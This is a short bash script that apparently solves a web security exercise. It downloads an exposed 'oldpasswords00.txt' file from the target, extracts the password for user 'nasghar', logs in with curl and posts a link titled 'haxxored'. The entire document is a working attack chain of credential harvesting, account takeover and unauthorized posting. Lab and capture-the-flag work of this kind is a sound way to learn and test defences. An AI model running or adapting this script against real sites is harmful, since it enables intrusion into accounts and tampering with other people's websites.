#!/bin/bash -eu
BASE=$1

USER=nasghar

echo -n "Downloading oldpassword file... "
PASSWORD=$(curl "http://${BASE}/files123/oldpasswords00.txt" 2>/dev/null | grep ${USER} | sed 's/.*|//')
echo "found password for user '${USER}'."

echo "Logging in as user '${USER}'..."
curl -X POST -c cookies.txt "http://${BASE}/post.php" -d "form=login" -d "username=${USER}" -d "password=${PASSWORD}"
echo "Posting new link..."
curl -X POST -b cookies.txt "http://${BASE}/post.php" -d "form=content" -d "type=2" -d "title=haxxored" -d "content=http://google.ca"
echo -e "\033[32mDone!\033[0m"

rm -f cookies.txt
